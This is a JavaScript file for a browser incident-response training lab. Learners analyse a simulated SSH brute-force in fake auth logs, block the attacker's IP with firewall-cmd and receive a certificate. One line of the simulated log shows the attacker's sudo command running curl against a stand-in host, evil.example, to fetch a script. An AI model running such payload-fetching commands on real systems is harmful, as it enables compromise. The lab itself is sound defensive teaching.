(() => {
  "use strict";

  const $ = (s) => document.querySelector(s);
  const screens = { welcome: $("#welcomeScreen"), lab: $("#labScreen"), result: $("#resultScreen") };

  const startForm = $("#startForm");
  const learnerNameInput = $("#learnerName");
  const nameError = $("#nameError");
  const terminalForm = $("#terminalForm");
  const commandInput = $("#commandInput");
  const terminalOutput = $("#terminalOutput");
  const terminalBody = $("#terminalBody");
  const timerElement = $("#timer");
  const scoreElement = $("#score");
  const progressText = $("#progressText");
  const progressBar = $("#progressBar");
  const certificateCanvas = $("#certificateCanvas");
  const instructorImage = $("#instructorImage");

  const taskElements = {
    logs: $("#taskLogs"),
    source: $("#taskSource"),
    pattern: $("#taskPattern"),
    respond: $("#taskRespond")
  };

  const ATTACKER_IP = "203.0.113.66";
  const TARGET_USER = "webadmin";

  // Simulated /var/log/secure content
  const SECURE_LOG = [
    "Aug 16 09:00:01 sec-node-01 sshd[1200]: Accepted password for student from 192.168.1.25 port 52144 ssh2",
    "Aug 16 09:12:44 sec-node-01 sshd[1240]: Failed password for invalid user admin from 203.0.113.66 port 44231 ssh2",
    "Aug 16 09:12:47 sec-node-01 sshd[1242]: Failed password for invalid user admin from 203.0.113.66 port 44232 ssh2",
    "Aug 16 09:12:50 sec-node-01 sshd[1244]: Failed password for invalid user root from 203.0.113.66 port 44233 ssh2",
    "Aug 16 09:13:03 sec-node-01 sshd[1250]: Failed password for webadmin from 203.0.113.66 port 44240 ssh2",
    "Aug 16 09:13:08 sec-node-01 sshd[1252]: Failed password for webadmin from 203.0.113.66 port 44241 ssh2",
    "Aug 16 09:13:12 sec-node-01 sshd[1254]: Failed password for webadmin from 203.0.113.66 port 44242 ssh2",
    "Aug 16 09:13:15 sec-node-01 sshd[1256]: Failed password for webadmin from 203.0.113.66 port 44243 ssh2",
    "Aug 16 09:13:18 sec-node-01 sshd[1258]: Accepted password for webadmin from 203.0.113.66 port 44244 ssh2",
    "Aug 16 09:14:02 sec-node-01 sudo: webadmin : TTY=pts/0 ; PWD=/home/webadmin ; COMMAND=/usr/bin/curl http://evil.example/x.sh"
  ].join("\n");

  const state = {
    learnerName: "",
    logs: false,
    source: false,
    pattern: false,
    respond: false,
    score: 0,
    commandHistory: [],
    historyIndex: 0,
    commandCount: 0,
    startedAt: 0,
    elapsedSeconds: 0,
    timerId: null,
    completed: false,
    certificateId: ""
  };

  function showScreen(name) {
    Object.values(screens).forEach((s) => s.classList.remove("is-active"));
    screens[name].classList.add("is-active");
    window.scrollTo({ top: 0, behavior: "smooth" });
  }
  function cleanName(v) { return v.replace(/\s+/g, " ").trim(); }
  function isValidName(v) { return v.length >= 2 && /[\p{L}]/u.test(v) && /^[\p{L}\p{M} .'-]+$/u.test(v); }

  startForm.addEventListener("submit", (e) => {
    e.preventDefault();
    const name = cleanName(learnerNameInput.value);
    if (!isValidName(name)) {
      learnerNameInput.setAttribute("aria-invalid", "true");
      nameError.textContent = "Enter a valid full name using letters, spaces, apostrophes, hyphens, or periods.";
      learnerNameInput.focus();
      return;
    }
    learnerNameInput.removeAttribute("aria-invalid");
    nameError.textContent = "";
    state.learnerName = name;
    beginChallenge();
  });
  learnerNameInput.addEventListener("input", () => { learnerNameInput.removeAttribute("aria-invalid"); nameError.textContent = ""; });

  function beginChallenge() {
    resetChallengeState();
    appendOutput("SEC-1601: Repeated failed SSH logins were followed by a successful login and suspicious activity.\nMission: analyse /var/log/secure, identify the attacker, correlate the pattern, and block the source IP.", "warning");
    showScreen("lab");
    startTimer();
    setTimeout(() => commandInput.focus(), 180);
  }

  function resetChallengeState() {
    clearInterval(state.timerId);
    state.logs = false; state.source = false; state.pattern = false; state.respond = false;
    state.score = 0; state.commandHistory = []; state.historyIndex = 0; state.commandCount = 0;
    state.startedAt = Date.now(); state.elapsedSeconds = 0; state.completed = false; state.certificateId = "";
    terminalOutput.replaceChildren(); commandInput.value = ""; commandInput.disabled = false;
    timerElement.textContent = "00:00"; updateProgress();
  }

  function startTimer() {
    clearInterval(state.timerId);
    state.startedAt = Date.now();
    state.timerId = setInterval(() => {
      state.elapsedSeconds = Math.floor((Date.now() - state.startedAt) / 1000);
      timerElement.textContent = formatDuration(state.elapsedSeconds);
    }, 250);
  }
  function formatDuration(t) { return Math.floor(t / 60).toString().padStart(2, "0") + ":" + String(Math.floor(t % 60)).padStart(2, "0"); }

  terminalForm.addEventListener("submit", (e) => {
    e.preventDefault();
    if (state.completed) return;
    const raw = commandInput.value.trim();
    commandInput.value = "";
    if (!raw) return;
    appendCommand(raw);
    state.commandHistory.push(raw);
    state.historyIndex = state.commandHistory.length;
    state.commandCount += 1;
    execute(raw);
    scrollTerminal();
  });

  commandInput.addEventListener("keydown", (e) => {
    if (e.key === "ArrowUp") { e.preventDefault(); if (state.commandHistory.length) { state.historyIndex = Math.max(0, state.historyIndex - 1); commandInput.value = state.commandHistory[state.historyIndex] || ""; requestAnimationFrame(() => commandInput.setSelectionRange(commandInput.value.length, commandInput.value.length)); } }
    if (e.key === "ArrowDown") { e.preventDefault(); if (state.commandHistory.length) { state.historyIndex = Math.min(state.commandHistory.length, state.historyIndex + 1); commandInput.value = state.commandHistory[state.historyIndex] || ""; } }
  });
  terminalBody.addEventListener("click", () => { if (!state.completed) commandInput.focus(); });

  function tokenize(cmd) {
    const t = [];
    const m = /"([^"]*)"|'([^']*)'|([^\s]+)/g; let x;
    while ((x = m.exec(cmd)) !== null) t.push(x[1] ?? x[2] ?? x[3]);
    return t;
  }

  function execute(raw) {
    let cmd = raw;
    if (/^sudo\s+/i.test(cmd)) cmd = cmd.replace(/^sudo\s+/i, "");
    const tokens = tokenize(cmd);
    const command = (tokens.shift() || "").toLowerCase();
    const args = tokens;
    switch (command) {
      case "cat": handleCat(args); break;
      case "tail": handleTail(args); break;
      case "head": handleHead(args); break;
      case "grep": handleGrep(args, raw); break;
      case "wc": handleWc(args); break;
      case "awk": handleAwk(args); break;
      case "firewall-cmd": handleFirewall(args); break;
      case "last": appendOutput("webadmin  pts/0        203.0.113.66    Sun Aug 16 09:13   still logged in\nstudent   pts/0        192.168.1.25    Sun Aug 16 09:00   still logged in"); break;
      case "lastb": appendOutput("admin     ssh:notty     203.0.113.66    Sun Aug 16 09:12 - 09:12\nroot      ssh:notty     203.0.113.66    Sun Aug 16 09:12 - 09:12\nwebadmin  ssh:notty     203.0.113.66    Sun Aug 16 09:13 - 09:13"); break;
      case "pwd": appendOutput("/home/analyst"); break;
      case "whoami": appendOutput("analyst"); break;
      case "hostname": appendOutput("sec-node-01"); break;
      case "uname": appendOutput("Linux"); break;
      case "date": appendOutput("Sun Aug 16 13:15:00 IST 2026"); break;
      case "clear": terminalOutput.replaceChildren(); break;
      case "history": appendOutput(state.commandHistory.map((c, i) => String(i + 1).padStart(4, " ") + "  " + c).join("\n")); break;
      case "help": showHelp(); break;
      case "man": appendOutput("SSHD(8)\nNAME\n    sshd - OpenSSH daemon\n\nGREP(1)\nNAME\n    grep - print lines matching a pattern\n\nFIREWALL-CMD(1)\nNAME\n    firewall-cmd - manage firewalld\n\nLAST(1)\nNAME\n    last - show listing of last logged in users"); break;
      case "": break;
      default: appendOutput("bash: " + command + ": command not found", "error");
    }
  }

  function handleCat(args) {
    const t = args.filter((a) => !a.startsWith("-")).pop() || "";
    if (t.includes("secure")) {
      appendOutput(SECURE_LOG);
      markObjective("logs", 20, "✓ Objective 1 passed — the authentication logs were inspected. +20 points");
      return;
    }
    appendOutput("cat: " + t + ": No such file or directory", "error");
  }

  function handleTail(args) {
    const n = parseInt((args.find((a) => a.startsWith("-n")) || "").replace("-n", ""), 10) || 10;
    const t = args.filter((a) => !a.startsWith("-")).pop() || "";
    if (t.includes("secure")) {
      appendOutput(SECURE_LOG.split("\n").slice(-n).join("\n"));
      markObjective("logs", 20, "✓ Objective 1 passed — the authentication logs were inspected. +20 points");
      return;
    }
    appendOutput("tail: cannot open '" + t + "': No such file or directory", "error");
  }

  function handleHead(args) {
    const n = parseInt((args.find((a) => a.startsWith("-n")) || "").replace("-n", ""), 10) || 10;
    const t = args.filter((a) => !a.startsWith("-")).pop() || "";
    if (t.includes("secure")) {
      appendOutput(SECURE_LOG.split("\n").slice(0, n).join("\n"));
      markObjective("logs", 20, "✓ Objective 1 passed — the authentication logs were inspected. +20 points");
      return;
    }
    appendOutput("head: cannot open '" + t + "': No such file or directory", "error");
  }

  function handleGrep(args, raw) {
    const count = /-c/.test(raw) || args.includes("-c");
    const targets = args.filter((a) => !a.startsWith("-") && a !== "-c");
    const pattern = targets.shift();
    if (!pattern) { appendOutput("Usage: grep [OPTION]... PATTERN [FILE]...", "error"); return; }
    const ci = /-i/.test(raw);
    const re = new RegExp(pattern.replace(/[.*+?^${}()|[\]\\]/g, "\\$&").replace(/^"|"$/g, ""), ci ? "i" : "");
    const lines = SECURE_LOG.split("\n").filter((l) => re.test(l));

    if (count) {
      appendOutput(String(lines.length));
      if (pattern.includes("Failed") || pattern.toLowerCase().includes("failed password")) {
        markObjective("pattern", 25, "✓ Objective 3 passed — the brute-force pattern was correlated. +25 points");
      }
      return;
    }
    if (lines.length) {
      appendOutput(lines.join("\n"));
      // identify attacker source
      if (/failed/i.test(pattern) || /password/i.test(pattern)) {
        markObjective("source", 25, "✓ Objective 2 passed — the attacker's source IP was identified. +25 points");
      }
      return;
    }
    appendOutput("(no matches)");
  }

  function handleWc(args) {
    const t = args.filter((a) => !a.startsWith("-")).pop() || "";
    if (t.includes("secure")) {
      const lines = SECURE_LOG.split("\n").length;
      const words = SECURE_LOG.split(/\s+/).length;
      appendOutput("  " + lines + "  " + words + "  " + SECURE_LOG.length + " " + t);
      markObjective("logs", 20, "✓ Objective 1 passed — the authentication logs were inspected. +20 points");
      return;
    }
    appendOutput("wc: " + t + ": No such file or directory", "error");
  }

  function handleAwk(args) {
    // awk '{print $11}' /var/log/secure — extract source IPs
    const t = args.filter((a) => !a.startsWith("-") && !a.startsWith("{")).pop() || "";
    if (t.includes("secure")) {
      const ips = SECURE_LOG.split("\n").map((l) => {
        const m = l.match(/(\d+\.\d+\.\d+\.\d+)/);
        return m ? m[1] : "";
      }).filter(Boolean);
      appendOutput([...new Set(ips)].join("\n"));
      markObjective("source", 25, "✓ Objective 2 passed — the attacker's source IP was identified. +25 points");
      return;
    }
    appendOutput("awk: cannot open '" + t + "'", "error");
  }

  function handleFirewall(args) {
    const joined = args.join(" ");
    const richRule = /--add-rich-rule/.test(joined);
    const reload = /--reload/.test(joined);
    const list = /--list-rich-rules|--list-all/.test(joined);
    const containsAttacker = joined.includes(ATTACKER_IP);

    if (list) {
      appendOutput("public (active)\n  services: ssh dhcpv6-client\n" + (state.respond ? "  rich rules:\n    rule family=ipv4 source address=" + ATTACKER_IP + " reject" : "  rich rules: (none)"));
      return;
    }
    if (reload) { appendOutput("success"); return; }
    if (richRule) {
      if (!containsAttacker) { appendOutput("firewall-cmd: rich rule must block the attacker's IP: " + ATTACKER_IP, "error"); return; }
      appendOutput("success\n(Note: run 'firewall-cmd --reload' to apply)");
      markObjective("respond", 30, "✓ Objective 4 passed — the attacker's IP was blocked. +30 points");
      completeChallenge();
      return;
    }
    appendOutput("firewall-cmd: use '--add-rich-rule', '--reload', '--list-all'");
  }

  function markObjective(key, points, message) {
    if (state[key]) return;
    state[key] = true;
    state.score += points;
    appendOutput(message, "success");
    updateProgress();
    showToast(message.replace(/^[^—]+—\s*/, "").replace(/\s*\+\d+ points$/, ""));
  }

  function showHelp() {
    appendOutput(
      "Security investigation commands:\n" +
      "  cat /var/log/secure              read auth logs\n" +
      "  tail -n 30 /var/log/secure       last lines\n" +
      "  grep 'Failed password' /var/log/secure   find failed logins\n" +
      "  grep -c 'Failed password' /var/log/secure  count attempts\n" +
      "  awk '{print $11}' /var/log/secure         extract source IPs\n" +
      "  last / lastb                     show logins & failed logins\n" +
      "  firewall-cmd --permanent --add-rich-rule 'rule family=ipv4 source address=203.0.113.66 reject'\n" +
      "  firewall-cmd --reload            apply the block\n" +
      "  history | clear | help           shell utilities",
      "info"
    );
  }

  function appendCommand(cmd) {
    const line = document.createElement("div");
    line.className = "output-entry output-command";
    const u = document.createElement("span"); u.className = "prompt-user"; u.textContent = "analyst@sec-node-01";
    const p = document.createElement("span"); p.className = "prompt-path"; p.textContent = ":~$";
    line.append(u, p, document.createTextNode(" " + cmd));
    terminalOutput.append(line);
  }
  function appendOutput(text, type) {
    if (text === "") return;
    const line = document.createElement("div");
    line.className = "output-entry output-text " + (type || "").trim();
    line.textContent = text;
    terminalOutput.append(line);
  }
  function scrollTerminal() { requestAnimationFrame(() => { terminalBody.scrollTop = terminalBody.scrollHeight; }); }

  function updateProgress() {
    const done = [state.logs, state.source, state.pattern, state.respond].filter(Boolean).length;
    scoreElement.textContent = String(state.score);
    progressText.textContent = done + " of 4 complete";
    progressBar.style.width = (done * 25) + "%";
    Object.entries(taskElements).forEach(([k, el]) => el.classList.toggle("is-complete", state[k]));
  }

  function completeChallenge() {
    if (state.completed || !state.respond) return;
    state.completed = true;
    state.score = 100;
    state.elapsedSeconds = Math.max(1, Math.floor((Date.now() - state.startedAt) / 1000));
    clearInterval(state.timerId);
    timerElement.textContent = formatDuration(state.elapsedSeconds);
    commandInput.disabled = true;
    state.certificateId = makeCertificateId(state.learnerName);
    RCWPassport.record({ type: "lab", name: state.learnerName });
    setTimeout(() => {
      $("#resultName").textContent = state.learnerName;
      $("#finalTime").textContent = formatDuration(state.elapsedSeconds);
      $("#commandCount").textContent = String(state.commandCount);
      showScreen("result");
      renderCertificate();
      showToast("Perfect score — your certificate is ready.");
    }, 1000);
  }

  $("#resetButton").addEventListener("click", () => { resetChallengeState(); appendOutput("Security task reset. Start by reading /var/log/secure.", "info"); startTimer(); commandInput.focus(); });
  $("#replayButton").addEventListener("click", beginChallenge);
  $("#fullscreenButton").addEventListener("click", async () => { try { if (!document.fullscreenElement) { await document.documentElement.requestFullscreen(); showToast("Focus mode enabled."); } else await document.exitFullscreen(); } catch { showToast("Focus mode is not available in this browser."); } });

  function showToast(m) { const t = $("#toast"); t.querySelector("p").textContent = m; t.classList.add("is-visible"); clearTimeout(showToast._t); showToast._t = setTimeout(() => t.classList.remove("is-visible"), 2800); }

  function makeCertificateId(name) {
    const now = new Date();
    const dp = [now.getFullYear(), String(now.getMonth() + 1).padStart(2, "0"), String(now.getDate()).padStart(2, "0")].join("");
    let h = 2166136261;
    const src = name + "|" + now.toISOString() + "|" + state.elapsedSeconds + "|cybersecurity";
    for (let i = 0; i < src.length; i++) { h ^= src.charCodeAt(i); h = Math.imul(h, 16777619); }
    return "RCW-SEC-" + dp + "-" + (h >>> 0).toString(36).toUpperCase().padStart(7, "0").slice(-7);
  }

  function renderCertificate() {
    const canvas = certificateCanvas; const ctx = canvas.getContext("2d"); const W = canvas.width; const H = canvas.height;
    ctx.clearRect(0, 0, W, H); ctx.fillStyle = "#f4f0e6"; ctx.fillRect(0, 0, W, H);
    ctx.save(); ctx.globalAlpha = 0.035; ctx.fillStyle = "#0b2b4c";
    for (let y = 0; y < H; y += 18) for (let x = (y / 18) % 2 ? 9 : 0; x < W; x += 18) ctx.fillRect(x, y, 1.5, 1.5);
    ctx.restore();
    ctx.strokeStyle = "#08233f"; ctx.lineWidth = 22; ctx.strokeRect(26, 26, W - 52, H - 52);
    ctx.strokeStyle = "#12a9e9"; ctx.lineWidth = 3; ctx.strokeRect(48, 48, W - 96, H - 96);
    ctx.strokeStyle = "#c8a847"; ctx.lineWidth = 2; ctx.strokeRect(62, 62, W - 124, H - 124);
    ctx.fillStyle = "#08233f"; ctx.fillRect(64, 64, W - 128, 130);
    ctx.fillStyle = "#0ba8ee"; ctx.fillRect(64, 188, W - 128, 6);
    roundedRect(ctx, 98, 91, 74, 74, 16); ctx.fillStyle = "#0ba8ee"; ctx.fill();
    ctx.fillStyle = "#fff"; ctx.font = "800 24px ui-monospace, monospace"; ctx.textAlign = "center"; ctx.fillText(">_", 135, 139);
    ctx.textAlign = "left"; ctx.fillStyle = "#ffffff"; ctx.font = "800 30px Arial, sans-serif"; ctx.fillText("RCW", 195, 126);
    ctx.fillStyle = "#4cc9ff"; ctx.font = "800 13px Arial, sans-serif"; ctx.fillText("IT TRAINING", 196, 151);
    ctx.textAlign = "right"; ctx.fillStyle = "#86a7bd"; ctx.font = "600 14px Arial, sans-serif"; ctx.fillText("LEARN  •  PRACTICE  •  MASTER  •  ACHIEVE", W - 101, 130);
    ctx.fillStyle = "#c9e9f6"; ctx.font = "500 12px Arial, sans-serif"; ctx.fillText("www.rcwittraining.in", W - 101, 154);
    ctx.textAlign = "center"; ctx.fillStyle = "#0ba8ee"; ctx.font = "800 15px Arial, sans-serif"; ctx.fillText("CERTIFICATE OF ACHIEVEMENT", W / 2, 266);
    ctx.fillStyle = "#08233f"; ctx.font = "700 61px Georgia, serif"; ctx.fillText("Cybersecurity Analyst Champion", W / 2, 336);
    ctx.fillStyle = "#6c7c86"; ctx.font = "400 19px Georgia, serif"; ctx.fillText("This certificate is proudly presented to", W / 2, 391);
    ctx.fillStyle = "#092b4c"; setFittedFont(ctx, state.learnerName, 830, 57, 34, "700", "Georgia, serif"); ctx.fillText(state.learnerName, W / 2, 468);
    const nw = Math.min(830, ctx.measureText(state.learnerName).width + 90);
    const g = ctx.createLinearGradient(W / 2 - nw / 2, 0, W / 2 + nw / 2, 0); g.addColorStop(0, "rgba(11,168,238,0)"); g.addColorStop(.5, "#0ba8ee"); g.addColorStop(1, "rgba(11,168,238,0)");
    ctx.fillStyle = g; ctx.fillRect(W / 2 - nw / 2, 489, nw, 2);
    ctx.fillStyle = "#4f6472"; ctx.font = "400 18px Arial, sans-serif";
    ctx.fillText("for successfully completing the RCW cybersecurity challenge", W / 2, 543);
    ctx.fillText("by analysing logs, identifying an attacker, and containing the incident.", W / 2, 574);
    const bx = 206, by = 706;
    ctx.beginPath(); ctx.arc(bx, by, 76, 0, Math.PI * 2); ctx.fillStyle = "#08233f"; ctx.fill();
    ctx.beginPath(); ctx.arc(bx, by, 64, 0, Math.PI * 2); ctx.strokeStyle = "#c8a847"; ctx.lineWidth = 3; ctx.stroke();
    ctx.fillStyle = "#ffffff"; ctx.font = "800 34px Arial, sans-serif"; ctx.fillText("100", bx, by + 1);
    ctx.fillStyle = "#52d4ff"; ctx.font = "800 12px Arial, sans-serif"; ctx.fillText("/ 100", bx, by + 25);
    ctx.fillStyle = "#6a7d88"; ctx.font = "800 11px Arial, sans-serif"; ctx.fillText("FINAL SCORE", bx, by + 102);
    ctx.textAlign = "left"; drawMeta(ctx, 350, 676, "ISSUED ON", formatCertDate(new Date()));
    drawMeta(ctx, 350, 754, "CERTIFICATE ID", state.certificateId);
    drawMeta(ctx, 660, 676, "CHALLENGE", "Log analysis and incident response");
    drawMeta(ctx, 660, 754, "STATUS", "All security objectives passed");
    const px = 1140, py = 685;
    ctx.save(); ctx.beginPath(); ctx.arc(px, py, 82, 0, Math.PI * 2); ctx.clip(); ctx.fillStyle = "#0c2e50"; ctx.fillRect(px - 84, py - 84, 168, 168);
    if (instructorImage.complete && instructorImage.naturalWidth) drawImageCover(ctx, instructorImage, px - 82, py - 82, 164, 164, 0.5, 0.25);
    ctx.restore(); ctx.beginPath(); ctx.arc(px, py, 86, 0, Math.PI * 2); ctx.strokeStyle = "#c8a847"; ctx.lineWidth = 4; ctx.stroke();
    ctx.beginPath(); ctx.arc(px, py, 94, 0, Math.PI * 2); ctx.strokeStyle = "rgba(8,35,63,.22)"; ctx.lineWidth = 2; ctx.stroke();
    ctx.textAlign = "center"; ctx.fillStyle = "#092b4c"; ctx.font = "italic 700 36px Georgia, serif"; ctx.fillText("Pradeep Raju", px, 822);
    ctx.strokeStyle = "#0ba8ee"; ctx.lineWidth = 2; ctx.beginPath(); ctx.moveTo(px - 112, 837); ctx.bezierCurveTo(px - 50, 826, px + 35, 849, px + 112, 834); ctx.stroke();
    ctx.fillStyle = "#6a7d88"; ctx.font = "800 10px Arial, sans-serif"; ctx.fillText("PRADEEP RAJU  •  RCW IT TRAINING", px, 861);
    ctx.fillStyle = "#e3ddd0"; ctx.fillRect(92, 895, W - 184, 1);
    ctx.textAlign = "left"; ctx.fillStyle = "#778994"; ctx.font = "500 10px Arial, sans-serif"; ctx.fillText("RCW IT Training certifies the successful completion recorded above.", 98, 921);
    ctx.textAlign = "right"; ctx.fillText("Security · Challenge 01", W - 98, 921);
  }
  function roundedRect(c, x, y, w, h, r) { c.beginPath(); c.roundRect(x, y, w, h, r); }
  function setFittedFont(c, text, maxW, s, minS, w, f) { let size = s; do { c.font = w + " " + size + "px " + f; size -= 1; } while (c.measureText(text).width > maxW && size >= minS); }
  function drawMeta(c, x, y, l, v) { c.fillStyle = "#81909a"; c.font = "800 10px Arial, sans-serif"; c.fillText(l, x, y); c.fillStyle = "#173c57"; c.font = "700 15px Arial, sans-serif"; c.fillText(v, x, y + 23); }
  function formatCertDate(d) { return d.toLocaleDateString("en-IN", { day: "numeric", month: "long", year: "numeric" }); }
  function drawImageCover(c, img, x, y, w, h, fx, fy) {
    const ir = img.naturalWidth / img.naturalHeight, tr = w / h;
    let sw = img.naturalWidth, sh = img.naturalHeight, sx = 0, sy = 0;
    if (ir > tr) { sw = img.naturalHeight * tr; sx = (img.naturalWidth - sw) * (fx || 0.5); }
    else { sh = img.naturalWidth / tr; sy = (img.naturalHeight - sh) * (fy || 0.5); }
    c.drawImage(img, sx, sy, sw, sh, x, y, w, h);
  }
  instructorImage.addEventListener("load", () => { if (state.completed) renderCertificate(); });

  $("#downloadPngButton").addEventListener("click", () => { if (!state.completed) return; renderCertificate(); certificateCanvas.toBlob((b) => { if (!b) return; downloadBlob(b, certFilename("png")); showToast("Certificate image downloaded."); }, "image/png"); });
  $("#downloadPdfButton").addEventListener("click", () => {
    if (!state.completed) return;
    renderCertificate();
    certificateCanvas.toBlob(async (b) => {
      if (!b) { showToast("Could not prepare the PDF. Please try again."); return; }
      const jpg = new Uint8Array(await b.arrayBuffer());
      const pdf = buildPdfFromJpeg(jpg, certificateCanvas.width, certificateCanvas.height);
      downloadBlob(new Blob([pdf], { type: "application/pdf" }), certFilename("pdf"));
      showToast("Certificate PDF downloaded.");
    }, "image/jpeg", 0.96);
  });
  function certFilename(ext) { const s = state.learnerName.toLowerCase().normalize("NFKD").replace(/[^a-z0-9]+/g, "-").replace(/^-|-$/g, "") || "learner"; return "rcw-security-" + s + "." + ext; }
  function downloadBlob(b, fn) { const u = URL.createObjectURL(b); const a = document.createElement("a"); a.href = u; a.download = fn; document.body.append(a); a.click(); a.remove(); setTimeout(() => URL.revokeObjectURL(u), 1500); }

  function buildPdfFromJpeg(jpegBytes, iw, ih) {
    const enc = new TextEncoder(); const chunks = []; const offsets = [0]; let length = 0;
    const push = (v) => { const b = typeof v === "string" ? enc.encode(v) : v; chunks.push(b); length += b.length; };
    const addObj = (n, header, stream) => { offsets[n] = length; push(n + " 0 obj\n" + header); if (stream) { push("\nstream\n"); push(stream); push("\nendstream"); } push("\nendobj\n"); };
    push(new Uint8Array([0x25,0x50,0x44,0x46,0x2d,0x31,0x2e,0x34,0x0a,0x25,0xe2,0xe3,0xcf,0xd3,0x0a]));
    addObj(1, "<< /Type /Catalog /Pages 2 0 R >>"); addObj(2, "<< /Type /Pages /Kids [3 0 R] /Count 1 >>");
    addObj(3, "<< /Type /Page /Parent 2 0 R /MediaBox [0 0 842 595] /Resources << /XObject << /Im0 5 0 R >> >> /Contents 4 0 R >>");
    const content = enc.encode("q\n842 0 0 595 0 0 cm\n/Im0 Do\nQ\n");
    addObj(4, "<< /Length " + content.length + " >>", content);
    addObj(5, "<< /Type /XObject /Subtype /Image /Width " + iw + " /Height " + ih + " /ColorSpace /DeviceRGB /BitsPerComponent 8 /Filter /DCTDecode /Length " + jpegBytes.length + " >>", jpegBytes);
    const xo = length; push("xref\n0 6\n"); push("0000000000 65535 f \n");
    for (let i = 1; i <= 5; i++) push(String(offsets[i]).padStart(10, "0") + " 00000 n \n");
    push("trailer\n<< /Size 6 /Root 1 0 R >>\nstartxref\n" + xo + "\n%%EOF\n");
    const out = new Uint8Array(length); let pos = 0; chunks.forEach((c) => { out.set(c, pos); pos += c.length; });
    return out;
  }
})();
